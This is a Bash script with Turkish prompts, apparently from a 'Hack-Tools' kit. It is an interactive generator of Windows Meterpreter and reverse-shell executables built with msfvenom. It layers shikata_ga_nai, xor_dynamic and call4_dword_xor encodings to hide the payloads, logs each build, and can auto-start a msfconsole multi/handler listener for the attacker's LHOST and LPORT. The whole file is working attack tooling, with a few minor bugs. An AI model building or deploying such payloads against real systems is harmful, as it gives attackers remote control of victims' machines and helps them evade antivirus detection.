#!/bin/bash
source modules/function_lib.sh


COMMAND_CHECK msfvenom 
msf_kurulum_kontrol(){

	if [[ ! -d "$HOME/Hack-Tools/msf" || "$command_st" = "0" ]] ; then 
		printf "\n${red}Kurulum yapılmamış...\n${reset}"
		sleep 1 && exit 
	fi 
}

#msf_kurulum_kontrol

clear 
msf_kurulum_kontrol
#set main varables

os_tpye="windows"
standart_out_formats="exe"

WINDOWS_PYLOADS_1="/meterpreter/reverse_http"
WINDOWS_PYLOADS_2="/meterpreter/reverse_tcp"
WINDOWS_PYLOADS_3="/meterpreter/reverse_https"
WINDOWS_PYLOADS_4="/shell/reverse_tcp_dns"

WINDOWS_ENCODER_1="x86/xor_dynamic"
WINDOWS_ENCODER_2="x86/call4_dword_xor"
WINDOWS_ENCODER_3="x86/shikata_ga_nai"

LOG_PATH=$HOME/Hack-Tools/msf/generate-$out_name.$standart_out_formats.txt
msfvenom_generator_standart_encoder(){
	msfvenom -p $use_pyload -e $use_encoder -i $encoder_pcs -a x86 --platform $os_tpye LHOST=$lhost_ip LPORT=$lport_no -f $standart_out_formats > $HOME/Hack-Tools/msf/$out_name.$standart_out_formats
}

msfvenom_generator_multi_encode(){
	msfvenom -p $use_pyload -a x86 -e $WINDOWS_ENCODER_3 -i 15 --platform $os_tpye LHOST=$lhost_ip LPORT=$lport_no -f raw | msfvenom --platform $os_tpye -a x86 -e $WINDOWS_ENCODER_1 -i 10 -f raw | msfvenom --platform $os_tpye -a x86 -e $WINDOWS_ENCODER_2 -i 5 -f $standart_out_formats -o $HOME/Hack-Tools/msf/$out_name.$standart_out_formats
	clear  

}

generate_log(){
	tip="x86"
	
	touch $HOME/Hack-Tools/msf/generate-$out_name.$standart_out_formats.txt
	date >> $LOG_PATH
	echo "$lhost_ip:$lport_no" >> $LOG_PATH
	echo "$os_tpye" >> $LOG_PATH
	echo "$use_pyload" >> $LOG_PATH
	echo "$out_name.$standart_out_formats" >> $LOG_PATH
	echo "Generated: Yes" >> $LOG_PATH
	echo "Typse(x64 or x86): $tip" >> $LOG_PATH
	echo "Multi encode (1 yes - 2 no): $multi_encode" >> $LOG_PATH
	
	if [[ "$multi_encode" = "0" ]];then 
		echo "Encoder and pcs: $en_code & $encode_pcs" >> $LOG_PATH
	elif [[ "$multi_encode" = "1" ]] ;then
			echo "Multi encode info:" >> $LOG_PATH
			echo "x86/shikata_ga_nai & 15" >> $LOG_PATH
			echo "x86/xor_dynamic & 10" >> $LOG_PATH
			echo "x86/call4_dword_xor & 5" >> $LOG_PATH
	else
		printf "${red}ERROR!${reset} \n"
	fi 	
}

start_listener(){
	clear 
	printf """${blue}------------------------------

$out_name.$standart_out_formats dosyanız $LOG_PATH içerisine oluşturuldu...!

------------------------------

Otomatik bağlantı dinleme başlatılsınmı (1 or 0) ?

------------------------------
${reset}"""
	read -p "Selections -> " auto_listiner_selections
	
	if [[ "$auto_listiner_selections" = "1" ]] ;then
		printf "${green}Starting...${reset}\n"
		msfconsole -q -x "use exploit/multi/handler ; set payload $use_pyload; set LHOST $lhost_ip; set LPORT $lport_no; exploit ; exit"

	elif [[ "$auto_listiner_selections" = "0" ]] ;then
		printf "${green}Dinleyici iptal ediliyor..."
		sleep 1
		clear 
	else 
		printf "${red}Ön tanımlı olarak başlatılıyor...!${reset}\n"
		msfconsole -q -x "use exploit/multi/handler ; set payload $use_pyload; set LHOST $lhost_ip; set LPORT $lport_no; exploit ; exit"
	fi
}

standart_encode(){
	default_encode_pcs="8"
	clear 
	printf "${blue}------------------------------

-Kaç kez encode edilecek seçiniz:
Default $default_encode_pcs

1- 1 kez (önerilmez) 
2- 10 kez
3- 16 kez
4  25 kez

99 - Exit 

------------------------------
${reset}"
	read -p "Selections -> " encoder_pcs_selection
	
	if [[ "$encoder_pcs_selection" = "1" ]] ;then
		ecoder_pcs="1"
		
	elif [[ "$encoder_pcs_selection" = "2" ]] ;then
		encoder_pcs="10"
	
	elif [[ "$encoder_pcs_selection" = "3" ]] ;then 
		encoder_pcs="16"
	
	elif [[ "$encoder_pcs_selection" = "4" ]] ;then
		encoder_pcs="25"
	
	elif [[ "$encoder_pcs_selection" = "99" ]] ;then
		printf "${yellow}Exiting...${reset}\n"
		sleep 0.5 && break 
	
	else 
		printf "${red}Using a default pcs${reset}\n"
		encoder_pcs="8"
	fi 
}


host_information_input(){
	clear 
	printf "${blue}}------------------------------${reset}\n\n"
	read -p "Enter a LHOST -> " lhost_ip
	printf "\n"
	read -p "Enter a LPORT -> " lport_no
	printf "\n"
	read -p "Enter a out name -> " out_name
	printf "\n"
	printf "${blue}------------------------------${reset}\n"
	sleep 1
	clear 
	printf "${blue}------------------------------${reset}\n\n"
	printf "${green}Generating...${reset}\n"
	
	printf """${blue}Özellikler:
Payload -> $use_pyload
Encoder tipi ve miktarı -> $use_encoder $encoder_pcs
Dosya adı -> $out_name.$standart_out_formats
LHOST & LPORT -> $lhost_ip:$lport_no


------------------------------
${reset}"""
sleep 1
}	


while :
do 
	printf "${blue}
------------------------------
- Payload Seçiniz:
Seçili sistem: $os_tpye

1- $WINDOWS_PYLOADS_1
2- $WINDOWS_PYLOADS_2
3- $WINDOWS_PYLOADS_3
4- $WINDOWS_PYLOADS_4

99 - Exit

------------------------------
${reset}\n"

	read -p "Selections -> " payload_selection
	
	if [[ "$payload_selection" = "1" ]] ;then
		use_pyload=$WINDOWS_PYLOADS_1
	
	elif [[ "$payload_selection" = "2" ]] ;then
		use_pyload=$WINDOWS_PYLOADS_2
	
	elif [[ "$payload_selection" = "3" ]] ;then
		use_pyload=$WINDOWS_PYLOADS_3
	
	elif [[ "$payload_selection" = "4" ]] ;then
		use_pyload=$WINDOWS_PYLOADS_4
	
	elif [[ "$payload_selection" = "99" ]] ;then
		printf "${yellow}exiting....${reset}\n"
		sleep 1 && break
	
	else 
		printf "\n${red}Bu alan boş bırakılamaz!${reset}\n"
		sleep 1
	fi #payload seçim kısmı bitmiştir 
	
	clear 
	
	printf "${blue}
------------------------------

Encoder selections:
Default: x86/shikata_ga_nai

1- $WINDOWS_ENCODER_1 -normal
2- $WINDOWS_ENCODER_2 -normal
3- $WINDOWS_ENCODER_3 -great
4- Multi encode 3 algoritma ile 15+10+5=30x encode 
99- Exit

------------------------------

${reset}"

	read -p "Selections -> " encoder_selection
	multi_encode=0 # çoklu encode işlemi seçilmezse diye 
	
	if [[ "$encoder_selection" = "1" ]] ;then
		use_encoder=$WINDOWS_ENCODER_1
		
	elif [[ "$encoder_selection" = "2" ]] ;then 
		use_encoder=$WINDOWS_ENCODER_2
		
	elif [[ "$encoder_selection" = "3" ]] ;then
		use_encoder=$WINDOWS_ENCODER_3
	
	elif [[ "$encoder_selection" = "4" ]] ;then 
		multi_encode="1"
		encoder_pcs="27"
		use_encoder="Multi encode"
	
	elif [[ "$encoder_selection" = "99" ]] ;then
		printf "\n${yellow}Exiting....${reset}\n"
	
	else
		printf "\n${red}Using a default encoder....${reset}\n"
		use_encoder="$WINDOWS_ENCODER_3" 
	fi #encoder seçme işlemimiz bitti 
	
	
	if [[ "$multi_encode" = "0" ]] ;then
		standart_encode
	fi
	
	host_information_input
	
	if [[ "$multi_encode" = "0" ]] ;then
		msfvenom_generator_standart_encoder
	elif [[ "$multi_encode" = "1" ]] ;then
		msfvenom_generator_multi_encode
	fi 
	
	if [[ -e "$LOG_PATH/$out_name.$standart_out_formats" ]] ;then
		generate_log
		start_listener
	else 
		printf "${red}ERROR!${reset}\n"
		sleep 1 && break
	fi
	
	
	




done 


